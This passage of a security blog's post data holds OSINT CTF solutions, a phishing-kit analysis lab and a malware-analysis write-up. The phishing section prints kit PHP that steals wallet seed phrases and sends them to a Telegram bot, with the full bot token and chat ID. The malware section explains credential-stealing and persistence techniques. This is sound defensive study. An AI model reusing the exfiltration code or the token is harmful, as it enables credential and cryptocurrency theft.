Easy</li>\n<li><strong>Link</strong>: <a href=\"https://mega.nz/file/VuViFT6J#w4hEz6IIYSSewyXZ08pupRsKo_Zdf9aebcl-YWMRRPg\">Here</a></li>\n</ul>\n<h3>Description:</h3>\n<p>I was on a mission to track down a notorious cybercriminal, someone responsible for a series of high-profile cyberattacks. My latest intel revealed that he was planning a fresh strike on a famous restaurant chain that had already been hit, leaking sensitive data. Through some clever digging, I managed to retrieve a single image of the place he was spotted—a quiet café, but the clues were all there. Now, it’s up to you. track him down, and uncover where he was before he disappears again. Time is ticking.</p>\n<p>Flag Format: <code>IEEE{**-*******}</code></p>\n<h3>Solution:</h3>\n<p>First, I tried to search the full image on google lens, but I didn&#39;t found somwthing useful, So I decided to take it part by part.</p>\n<p>I noticed the reversed word on the umbrella <code>Bazooka</code> -which is a famous fried chicken restaurant- and a flag for <code>Cup &amp; Task</code> cafe in the other side, I started to searching on google maps for any branchs of <code>Bazooka</code> that is near to a branch of <code>Cup &amp; task</code>.</p>\n<p>I have got a match on <code>Orium mall</code> at <code>El-Shorouk</code> city, so I tried that and I got the point.</p>\n<p><img src=\"/assets/images/reverse-engineering/IEEE-VICTORIS-3.0/map.png\" alt=\"alt text\"></p>\n<h3>Flag:</h3>\n<p><span style=\"color:#00FFFF;\"><strong>IEEE{El-Shorouk}</strong></span></p>\n<h2><span dir=\"rtl\">المصفوع</span></h2>\n<ul>\n<li><strong>Category</strong>: OSINT</li>\n<li><strong>Difficulty</strong>: Easy</li>\n</ul>\n<h3>Description:</h3>\n<p>In a sudden eruption of chaos, a former writer for a famous American media personality struck a man in the face multiple times before running away. Witnesses were left in shock, and now, a crucial question remains: who was the man she attacked? Your mission is to uncover his identity and reveal the story behind this enigmatic encounter.\nFlag Format: IEEE{FirstName_LastName}</p>\n<h3>Solution:</h3>\n<p>All I had to do is to search on google with the phrase <code>A writer for American media personality struck a man in the face multiple times</code> and from the <a href=\"https://pagesix.com/2024/04/09/celebrity-news/former-howard-stern-show-writer-elisa-jordana-arrested-after-repeatedly-hitting-man/\">first website</a> I got the female writer&#39;s name</p>\n<p>The article only mentioned the man as <code>Zscorro</code> but never mentioned his real-name, So I start to search on <code>Who is Zscorro</code> <code>Elisa Jordana&#39;s boyfriend</code> and I found his name <a href=\"https://www.wikibiostar.com/articles/who-is-elisa-jordana-boyfriend-zscorro-and-what-happened-to-him/\">here</a></p>\n<h3>Flag:</h3>\n<p><span style=\"color:#00FFFF;\"><strong>IEEE{Bahram_Alipour}</strong></span></p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/grabthephisher",
    "slug": "grabthephisher",
    "title": "GrabThePhisher",
    "description": "A Walkthrough to the Cyberdefenders blue team lab focusing on Threat Intel and Reverse Engineering.",
    "date": "September 14, 2024",
    "readTime": "5 min read",
    "tags": [
      "Malware"
    ],
    "category": "Tutorials & Labs",
    "imageUrl": "/assets/images/reverse-engineering/GrabThePhisher/wallets.png",
    "content": "<h1><a href=\"https://cyberdefenders.org/blueteam-ctf-challenges/95/\"><strong>GrabThePhisher</strong></a></h1>\n<h2><strong>Scenario</strong></h2>\n<p>An attacker compromised a server and impersonated <code>https://pancakeswap.finance/</code>, a decentralized exchange native to BNB Chain, to host a phishing kit at <code>https://apankewk.soup.xyz/mainpage.php</code>. The attacker set it as an open directory with the file name <code>pankewk.zip</code>. </p>\n<p>Provided the phishing kit, you as a soc analyst are requested to analyze it and do your threat intel homework.</p>\n<p><strong>Author:</strong> Milann SHRESTHA<br><strong>Difficulty:</strong> Easy </p>\n<h2>Walkthrough</h2>\n<p>We start by unzipping the file named <code>c75-GrabThePhisher.zip</code>, which has been provided, using <code>cyberdefenders.org</code> as password.</p>\n<h3><strong>Q1:</strong> Which wallet is used for asking the seed phrase?</h3>\n<p>After decompressing, we are left with some files including an HTML file, exploring the content we see some wallets, only one of these wallets matches </p>\n<p><img src=\"/assets/images/reverse-engineering/GrabThePhisher/wallets.png\" alt=\"alt text\"></p>\n<p>Exploring the code, We see that only one wallet that has a &quot;onclick&quot; event for its buttons is <code>MetaMask</code> which uses JavaScript (vib(1); jj2 = true; jj = true;). This is commonly designed for asking the seed phrase.</p>\n<p><img src=\"/assets/images/reverse-engineering/GrabThePhisher/index-3.png\" alt=\"alt text\">\n<img src=\"/assets/images/reverse-engineering/GrabThePhisher/index-1.png\" alt=\"alt text\"> \n<img src=\"/assets/images/reverse-engineering/GrabThePhisher/index-2.png\" alt=\"alt text\"></p>\n<blockquote>\n<p><strong>Answer:</strong> <code>Meta****</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q2:</strong> What is the file name that has the code for the phishing kit?</h3>\n<p>Opening the Metamask folder, there are three files: </p>\n<ul>\n<li>Fonts</li>\n<li>index.html</li>\n<li>metamask.php</li>\n</ul>\n<p>Inside the <code>metamask.php</code>, we see thee following code:</p>\n<pre><code class=\"language-php\">$date = date(&quot;m.d.Y&quot;);\n$message = &quot;&lt;b&gt;Welcome 2 The Jungle &lt;/b&gt; \n    \n&lt;b&gt;Wallet:&lt;/b&gt; Metamask\n&lt;b&gt;Phrase:&lt;/b&gt; &lt;code&gt;&quot; . $_POST[&quot;data&quot;] . &quot;&lt;/code&gt;\n&lt;b&gt;IP:&lt;/b&gt; &quot; .$_SERVER[&#39;REMOTE_ADDR&#39;] . &quot; | &quot; .$geo. &quot; | &quot; .$city. &quot;\n&lt;b&gt;User:&lt;/b&gt; &quot; . $_SERVER[&#39;HTTP_USER_AGENT&#39;] . &quot;&quot;;\n</code></pre>\n<p>This constructs an HTML-formatted message containing:</p>\n<ul>\n<li>The wallet type (MetaMask is hardcoded).</li>\n<li>The recovery phrase entered by the victim <code>$_POST[&quot;data&quot;]</code>.</li>\n<li>The attacker captures this phrase, which can be used to take full control of the victim’s wallet.</li>\n<li>The IP address, geolocation (country and city), and the user-agent string (browser and device information).</li>\n</ul>\n<p>So, this is the file that  has the code for the phishing kit.</p>\n<blockquote>\n<p><strong>Answer:</strong> <code>Meta****.php</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q3:</strong> In which language was the kit written?</h3>\n<blockquote>\n<p><strong>Answer:</strong> <code>PHP</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q4:</strong> What service does the kit use to retrieve the victim&#39;s machine information?</h3>\n<p>At the beginning the code, we see the following block:</p>\n<pre><code class=\"language-php\">$request = file_get_contents(&quot;http://api.sypexgeo.net/json/&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]); \n$array = json_decode($request);\n$geo = $array-&gt;country-&gt;name_en;\n$city = $array-&gt;city-&gt;name_en;\n</code></pre>\n<p>This block of code uses the <code>Sypex Geo</code> API to retrieve the geolocation of the user based on their IP address <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>, The country and city names are extracted and stored in $geo and $city.</p>\n<blockquote>\n<p><strong>Answer:</strong> <code>Sy*** G**</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q5:</strong> How many seed phrases were already collected?</h3>\n<p>later in the code, we see this block:</p>\n<pre><code class=\"language-php\">$_POST[&quot;import-account__secret-phrase&quot;]. $text = $_POST[&#39;data&#39;].&quot;\\n&quot;;\n@file_put_contents($_SERVER[&#39;DOCUMENT_ROOT&#39;].&#39;/log/&#39;.&#39;log.txt&#39;, $text, FILE_APPEND);\t\n</code></pre>\n<p>Which is used to ensures the attacker has a backup of the stolen phrases, the recovery phrase <code>$_POST[&#39;data&#39;]</code> is also logged locally in a file <code>log.txt</code> on the server.</p>\n<p>Now, we go the <code>log.txt</code>, we see that it has 3 already collected phrases:</p>\n<p><img src=\"/assets/images/reverse-engineering/GrabThePhisher/logs.png\" alt=\"alt text\"></p>\n<blockquote>\n<p><strong>Answer:</strong> <code>3</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q6:</strong> Write down the seed phrase of the most recent phishing incident?</h3>\n<blockquote>\n<p><strong>Answer:</strong> <code>father also recycle ******** ******** ******** ******** ******** ******** ******** ********</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q7:</strong> Which medium had been used for credential dumping?</h3>\n<p>The following block of code uses the <code>sendTel()</code> function to send a crafted message to a Telegram chat.</p>\n<p>The Telegram Bot API is used here. The bot token <code>$token</code> and chat ID <code>$id</code> are hardcoded.</p>\n<p>It constructs the Telegram API URL and uses <code>file_get_contents()</code> to send the message via the bot, delivering the stolen information (recovery phrase, IP, etc.) to the attacker&#39;s Telegram account.</p>\n<pre><code class=\"language-php\">sendTel($message);  \n    \nfunction sendTel($message){\n    $id = &quot;5442785564&quot;; \n    $token = &quot;5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10&quot;; \n    $filename = &quot;https://api.telegram.org/bot&quot;.$token.&quot;/sendMessage?chat_id=&quot;.$id.&quot;&amp;text=&quot;.urlencode($message).&quot;&amp;parse_mode=html&quot;;\n    file_get_contents($filename);\n</code></pre>\n<blockquote>\n<p><strong>Answer:</strong> <code>Tele****</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q8:</strong> What is the token for the channel?</h3>\n<blockquote>\n<p><strong>Answer:</strong> <code>5457463144:AAG8t4k7e2e************************</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q9:</strong> What is the chat ID of the phisher&#39;s channel?</h3>\n<blockquote>\n<p><strong>Answer:</strong> <code>5442******</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q10:</strong> What are the allies of the phish kit developer?</h3>\n<p>The attacker had fingerprinted his code with the following greeting message:</p>\n<pre><code class=\"language-php\">/*\n With love and respect to all the hustler out there,\n This is a small gift to my brothers,\n All the best with your luck,\n \n Regards, \n j1j1b1s@m3r0\n */\n</code></pre>\n<blockquote>\n<p><strong>Answer:</strong> <code>j1j1b1s@****</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q11:</strong> What is the full name of the Phish Actor?</h3>\n<p>Using the following request to the getChat method:</p>\n<pre><code class=\"language-php\">https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564\n</code></pre>\n<p>The response is:</p>\n<p><img src=\"/assets/images/reverse-engineering/GrabThePhisher/api_response.png\" alt=\"alt text\"></p>\n<blockquote>\n<p><strong>Answer:</strong> <code>Mar*** Aure****lius****</code></p>\n</blockquote>\n<hr>\n<h3><strong>Q12:</strong> What is the username of the Phish Actor?</h3>\n<blockquote>\n<p><strong>Answer:</strong> <code>pumpkin****</code></p>\n</blockquote>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/pmach11",
    "slug": "pmach11",
    "title": "Chapter-11 PMA Write-up",
    "description": "A solution to two labs of chapter-11 from (Practical Malware Analysis) Book",
    "date": "August 1, 2024",
    "readTime": "17 min read",
    "tags": [
      "Malware"
    ],
    "category": "Tutorials & Labs",
    "imageUrl": "/assets/images/Tutorials-Labs/PMAch11/pestudio.png",
    "content": "<h1><span style=\"color:#004F98;\"><strong>Lab 11-1 :</strong></span></h1>\n<p>Analyze the malware found in Lab11-01.exe</p>\n<p><strong>General information:</strong></p>\n<blockquote>\n<p>Type :  EXE<br>CPU :  32-bit<br>Subsystem :  Console<br>Packing :   NO<br>md5 Hash : A9C55BB87A7C5C3C923C4FA12940E719</p>\n</blockquote>\n<p><span style=\"color:#00FFFF;\"><strong>Q1:</strong></span>\nWhat does the malware drop to disk?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span>\nThe malware drops a DLL from the <code>TGAD</code> resource called <code>msgina32.dll</code>.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>First searching the hash on <a href=\"https://www.virustotal.com/gui/file/57d8d248a8741176348b5d12dcf29f34c8f48ede0ca13c30d12e5ba0384056d7\">Virus-Total</a> I found that it was identified as dropper, so, I open PE-Studio to have a look on the resources and I found an exe file named <code>TGAD</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/pestudio.png\" alt=\"PE-Studio\"></p>\n<p>Opening IDA and searching for <code>FindResourceA</code> in imports window we can see that it was called only one time by <code>sub_401080</code> at the beginning of the main function.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/FindResourceA.png\" alt=\"alt text\"></p>\n<p>By getting into the call we can see that the typical 4 standard functions are called to drop a resource.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/LoadingResource.png\" alt=\"alt text\"></p>\n<p>By opening IDA debugger and setting a breakpoint at <code>FindResourceA</code> API call, we see that the resource name is <code>TGAD</code> with type binary, then the <code>LoadResource</code> API retrieves the handle to the data associated with the resource, the <code>LockResource</code> API obtains the pointer to the actual resource, finally, the binary determines the size of the resource (PE file) using the <code>SizeofResource</code> API which is 1A00 (6,656 bytes).</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/parametrs.png\" alt=\"alt text\"></p>\n<p>After that the binary drops the resource as a DLL called <code>msgina32.dll</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/dropping-resource.png\" alt=\"alt text\"></p>\n<p>Going back to main, we see a call to <code>sub_401000</code>, inside it, <code>RegCreateKeyExA</code> is called to create the regkey <code>hKey\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>, notice that the samDesired parameter is set to <code>0F003F</code> which according to <a href=\"https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights\">MSDN Registry Key Security and Access Rights</a> stands for <code>KEY_ALL_ACCESS</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/registry1.png\" alt=\"alt text\"></p>\n<p>After that, <code>RegSetValueExA</code> API is called to set the value to the created key to be <code>GinaDLL</code>, After that it closes the handle.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/registry2.png\" alt=\"alt text\"></p>\n<p>So, we know that, the binary drops a DLL called msgina32.dll from resourses then installs it as GINA DLL by adding it to <em>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GinaDLL</em> which leads us to think that this is a <code>GINA Interception</code> which is a known technique for harvesting credentials.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2:</strong></span>\nHow does the malware achieve persistence?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span>\nThe malware achieve persistence by registering the dropped <code>msgina32.dll</code> as a custom GINA DLL in the following Windows Registry </p>\n<blockquote>\n<p>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GinaDLL</p>\n</blockquote>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>As mentioned previously persistence is achieved by registering <code>msgina32.dll</code>, which was dropped from <code>TGAD</code> resource, as a custom GINA DLL in the Windows Registry at the following location:</p>\n<blockquote>\n<p>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\GinaDLL</p>\n</blockquote>\n<p>According to <a href=\"https://learn.microsoft.com/en-us/windows/win32/secauthn/gina\">MSDN&#39;s GINA documentation</a>, The GINA operates in the context of the Winlogon process and, as such, the GINA DLL is loaded very early in the boot process, which mean that the malicious dropped DLL will run whenever a user tries to logon to the infected device.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3:</strong></span>\nHow does the malware steal user credentials?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<p>The malware steals user credentials by performing GINA interception. The \n<code>msgina32.dll</code> file intercepts user credentials submitted to the system for authentication.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>Let&#39;s switch our analysis to the malicious dropped file.</p>\n<p><strong>General information:</strong></p>\n<blockquote>\n<p>Type :  DLL<br>CPU :  32-bit<br>Packing :   NO<br>md5 Hash : 7CE4F799946F0FA44E5B2B5E6A702F27</p>\n</blockquote>\n<p><strong>Now, Let&#39;s open it in IDA.</strong></p>\n<p>First, let&#39;s have a look on the <strong>DllMain</strong> function.</p>\n<p>A call to <code>DisableThreadLibraryCalls</code> is made to Disables the <em>DLL_THREAD_ATTACH</em> and <em>DLL_THREAD_DETACH</em> notifications, then a call to <code>GetSystemDirectoryW</code> to retrieve the path of the system directory which contains system files such as dynamic-link libraries and drivers, then a call to <code>lstrcatw</code> is used to appends <code>\\\\MSGina</code> string to the system directory retrieve previously, finally, it calls <code>LoadLibraryW</code> to load the dll with the appended name.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/DllMain.png\" alt=\"alt text\"></p>\n<p>Using <strong>x32dbg</strong>, we can see that the library being load is at<code>C:\\\\Windows\\\\system32\\\\MSGina</code> which is the original msgina.dll.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/LoadLibraryW.png\" alt=\"alt text\"></p>\n<p>After that, the handle to the original msgina.dll is passed to <code>hLibModule</code> to be used later then the DllMain ends.</p>\n<p><strong>Now, let&#39;s have a look to the other exports.</strong></p>\n<p>As we see there is about 21 API that starts with <code>Wlx</code> which was expected in a GINA replacement,</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/Exports.png\" alt=\"alt text\"></p>\n<p>If we analyzed any function of these we will see that it only passes through to the true API contained in the original msgina.dll except for <code>WlxLoggedOutSAS</code>, So we will focus on <code>WlxLoggedOutSAS</code> API as it will be passed user credentials whenever someone tries to logon at the logon screen.</p>\n<p>In the <code>WlxLoggedOutSAS </code>, we see the usual passing to the true msgina API in addition to some extra code, a bunch of arguments and a format string that will be passed to <code>sub_10001570</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/formatting.png\" alt=\"alt text\"></p>\n<p><strong>Examining the <code>sub_10001570</code> we see that:</strong></p>\n<ul>\n<li>A file called <code>msutil32.sys</code> is opened</li>\n<li>Date and time are recorded using <code>_wstrtime</code> and <code>_wstrdate</code>.</li>\n<li>logging some info using the format &quot;%s %s %s&quot; in the <code>msutil32.sys</code> file.</li>\n</ul>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_10001570.png\" alt=\"alt text\"></p>\n<p>So, we know that the <code>WlxLoggedOutSAS</code> is the resposible for the logging process but <strong>what are the data being logged?</strong></p>\n<p>We can see that these Data in EAX (Args) were in the ESI register which contains  the <code>pNprNotifyInfo</code> parameter that will be passed to the original <code>WlxLoggedOutSAS</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/logged-data.png\" alt=\"alt text\"></p>\n<p>According to <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winwlx/nf-winwlx-wlxloggedoutsas\">MSDN Page</a>, the <code>pNprNotifyInfo</code> parameter contains a pointer to an <code>WLX_MPR_NOTIFY_INFO</code> structure that contains:</p>\n<ul>\n<li>User Name</li>\n<li>Domain</li>\n<li>Password</li>\n<li>Old Password</li>\n</ul>\n<p><strong>Working Mechanism :</strong></p>\n<ol>\n<li>Replacing the malicious dropped DLL with the original one in the winlogon registry key.</li>\n<li>When <code>Winlogon.exe</code> calls a function, the malicious GINA reforwards the call the the original GINA.</li>\n<li>When <code>winlogon.exe</code> calls <code>WlxLoggedOutSAS</code> API, the malicious GINA calls the original <code>WlxLoggedOutSAS</code> API then logs the info in <code>msutil32.sys</code>.</li>\n</ol>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/illustration.png\" alt=\"alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q4:</strong></span>\nWhat does the malware do with stolen credentials?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer:</strong></span></p>\n<p>As we mentiond, the malware will create a file called <code>msutil32.sys</code> which will contain Username, Domain, and Password which will be logged with a timestamp of a particular user every time a call is made to the exported function <code>WlxLoggedOutSAS</code> of <code>msgina32.dll</code>.</p>\n<p>We can tell that the directory to the logging file is <code>C:\\Windows\\System32\\msutil32.sys</code> since that is where Winlogon \nresides (and msgina32.dll is running in the Winlogon process).</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q5:</strong></span>\nHow can you use this malware to get user credentials from your test \nenvironment?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer:</strong></span></p>\n<p>Once the GINA DLL is dropped and installed, the system needs to be rebooted so that the GINA interception starts, the malware logs credentials \nonly when the <code>WlxLoggedOutSAS</code> API is called, so log out and back in to see the stolen credentials.</p>\n<p><span style=\"color:#00FFFF;\"><strong>NOTE</strong></span><strong>:</strong>\nGINA DLLs no longer exist in Windows Vista and later versions, this stealing tactic will only work in Windows XP or older versions.</p>\n<hr>\n<hr>\n<h1><span style=\"color:#004F98;\"><strong>Lab 11-2 :</strong></span></h1>\n<p>Analyze the malware found in Lab11-02.dll. Assume that a suspicious file named Lab11-02.ini was also found with this malware.</p>\n<p><strong>General information:</strong></p>\n<blockquote>\n<p>Type :  DLL<br>CPU :  32-bit<br>Packing :   NO<br>md5 Hash : BE4F4B9E88F2E1B1C38E0A0858EB3DD9</p>\n</blockquote>\n<p><span style=\"color:#00FFFF;\"><strong>Q1:</strong></span>\nWhat are the exports for this DLL malware?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Answer:</strong></span></p>\n<p>First, by opening the binary in <strong>CFF Explorer</strong>, we can see that it has only one exported function called <code>installer</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/CFF-exports.png\" alt=\"alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q2:</strong></span>\nWhat happens after you attempt to install this malware using \nrundll32.exe?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<p>When we install the malware it does two jobs:</p>\n<ol>\n<li>Add the <code>spoolvxx32.dll</code> to the <code>AppInit_DLLs</code> registry key.</li>\n<li>Copy the malware to another executable named <code>spoolvxx32.dll</code> at the address <code>C:\\\\Windows\\\\system32\\\\spoolvxx32.dll</code> if it not aleardy exists.</li>\n</ol>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>First, let&#39;s install the malware using the following command line while monitoring using <strong>procmon</strong>.</p>\n<pre><code>rundll32.exe Lab11-02.dll , installer\n</code></pre>\n<p>After applying some filters, we can see that malware tries to open  the <code>Lab11-02.ini</code> file, then it creates a file called <code>spoolvxx32.dll</code> with path <code>C:\\Windows\\SysWOW64\\spoolvxx32.dll</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/procmon.png\" alt=\"alt text\"></p>\n<p>Now, let&#39;s open the malware in <strong>IDA</strong> to see what is happening.</p>\n<p>Inside the <strong>installer</strong> exported function, we can see that the malware open the <code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> and adds the value <code>spoolvxx32.dll</code> to the <code>AppInit_DLLs</code>.</p>\n<p>After that, a call to <code>sub_1000105B</code> happened which will simply call <code>GetSystemDirectoryA</code> API, then the malware copies a file to the retrieved system directory using <code>CopyFileA</code> API.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/installer.png\" alt=\"alt text\"></p>\n<p>To know the details of the copying process, I opened x64dbg and set the EIP to the address of the <strong>installer</strong> function, I inserted a break-point in the address of <strong>CopyFileA</strong> API and looked for the pushed parameters, we get these parameters.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/CopyFileA.png\" alt=\"alt text\"></p>\n<p>So, Now we know that the installer exported function does two jobs:</p>\n<ol>\n<li>Add the <code>spoolvxx32.dll</code> to the <code>AppInit_DLLs</code> registry key.</li>\n<li>Copy the malware to another executable named <code>spoolvxx32.dll</code> at the address <code>C:\\\\Windows\\\\system32\\\\spoolvxx32.dll</code> if it not aleardy there.</li>\n</ol>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q3:</strong></span>\nWhere must Lab11-02.ini reside in order for the malware to install \nproperly?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<p>The .ini file must reside in <code>C:\\\\Windows\\\\system32\\\\Lab11-02.ini</code> so that the malwere installation goes successfully.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>Going back to the <strong>DllMain</strong> function, we see a call to <code>GetModuleFileNameA</code> API to retrieves the path for the file that contains module loaded by the current process, then a call to <code>sub_1000105B</code> again which calls <code>GetSystemDirectoryA</code> API, then <code>strncat</code> is called to concatenate the full path of the file that will be created (or opened)\nnext using <code>CreateFileA</code> API.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/DllMain2.png\" alt=\"alt text\"></p>\n<p>To get the full concatenated path I used x32dbg and set a break point at <code>strncat</code>&#39;s address, we can see that the two strings passed to be concatenated are <code>C:\\\\Windows\\\\system32</code> and <code>\\\\Lab11-02.ini</code>, we can see that they were concatenated successfully and stored as a return value in the EAX </p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/strncat-params.png\" alt=\"alt text\"><br><img src=\"/assets/images/Tutorials-Labs/PMAch11/EAX.png\" alt=\"alt text\"></p>\n<p>As we said, the malware will try to access the .ini file in the mentioned path using <code>CreateFileA</code> API function, this API function can be used to either create or open a file.</p>\n<p>The <code>dwCreationDisposition</code> parameter is the one responsible for the action that will be taken, according to <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea\">MSDN page</a>, the value <code>3</code> stands for <code>OPEN_EXISTING</code> which means that the function will open a file or device only if it exists, if the specified file or device does not exist, the function will fail.</p>\n<p>If the malware successfully opens the .ini file, it will call <code>ReadFile</code> to read about <code>0x100</code> byte (256 byte in decimal) from the .ini file and copy them to a global variable <code>byte_100034A0</code>, after that the malware checks if the read process is successful by checking that the file size is greater than 0, if successful, the malware will call <code>sub_100010B3</code> subroutine, close the handle then call <code>sub_100014B6</code> then DllMain finishes.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/ReadFile2.png\" alt=\"alt text\"></p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q4:</strong></span>\nHow is this malware installed for persistence?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<p>The malware adds a copied version of itself to the <code>AppInit_DLLs</code> registry value, which causes the malware to be loaded into the address space everytime a process loads <strong>User32.dll</strong>.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>Based on our analysis to <strong>installer</strong> function, we knows that the malware adds a copied version of itself with the name <code>spoolvxx32.dll</code> to the <code>AppInit_DLLs</code> registry key.</p>\n<p>According to <a href=\"https://learn.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls?source=recommendations#about-appinit_dlls\">AppInit_DLLs Documentation</a>, \nthe AppInit_DLLs infrastructure provides an easy way to hook system APIs by allowing custom DLLs to be loaded into the address space of every interactive application. Applications and malicious software both use AppInit DLLs for the same basic reason, which is to hook APIs.</p>\n<p>AppInit_DLLs are loaded into every process that loads <strong>User32.dll</strong>, and a simple insertion into the registry -Like the one that installer does- will make \nAppInit_DLLs persistent.</p>\n<hr>\n<p><span style=\"color:#00FFFF;\"><strong>Q5:</strong></span>\nWhat user-space rootkit technique does this malware employ?</p>\n<p><span style=\"color:#00FFFF;\"><strong>Short Answer:</strong></span></p>\n<p>This malware installs an inline hook at the beginning of the <code>send</code> API function.</p>\n<p><span style=\"color:#00FFFF;\"><strong>Detailed Answer :</strong></span></p>\n<p>Based on our analysis to the <strong>DllMain</strong> function, we know that if the malware successfully read the <code>Lab11-02.ini</code> it will call <code>sub_100010B3</code> subroutine, close the handle then call <code>sub_100014B6</code> then DllMain finishes.</p>\n<p>By analyzing the <code>sub_100010B3</code> subroutine, we can assume that it&#39;s a decoding mechanism, so we will exceed it for now and continue our analysis for <code>sub_100014B6</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/decoder.png\" alt=\"alt text\"></p>\n<p>Inside the <code>sub_100014B6</code>, we can see that it first calls <code>sub_10001075</code> which will call <code>GetModuleFileNameA</code> which will return the full path to the process in which the DLL is loaded because the argument hModule is set to 0 before the call to this function, then it calls <code>sub_10001104</code> to return the value in <code>var_4</code> (the string pointer passed to the function).</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_100014B6-1.png\" alt=\"alt text\"></p>\n<p>After that, a call to <code>sub_1000102D</code> happens to convert the process name to uppercase, then it compares it with [THEBAT.EXE, OUTLOOK.EXE, MSIMN.EXE], if it matches any of those processes then the malware calls <code>sub_100013BD</code> followed by a call to <code>sub_100012A3</code> and <code>sub_10001499</code></p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_100014B6-2.png\" alt=\"alt text\"></p>\n<p>The <code>sub_100013BD</code> subroutine start with a call to <code>GetCurrentProcessId</code> then another call to <code>sub100012FE</code> which will suspend all of the threads in the current process (except for th  current thread) using calls to <code>SuspendThread</code> API</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_100013BD.png\" alt=\"alt text\"></p>\n<p>Later in <code>sub_10001499</code> the Converse action will be taken to resume all the previously suspended threads using calls to <code>ResumeThread</code>.</p>\n<p><img src=\"/assets/images/Tutorials-Labs/PMAch11/sub_10001499.png\" alt=\"alt text\"></p>\n<p>So, we have a subroutine that suspends all threads and another that resumes all of them back and between them we have a function call to <code>sub_100012A3</code>,  so we can assume that this is where the hook is being installed</p>\n<p>The <code>sub_100012A3</code> first calls <code>GetModuleHandleA</code> and <code>LoadLibraryA</code> to resolve the <code>send</code> API function, after that it push the <code>sub_1000113D</code> and <code>dword_10003484</code> as parameters to the <code>sub_10001203</code> subroutine.</p>\n<p><img 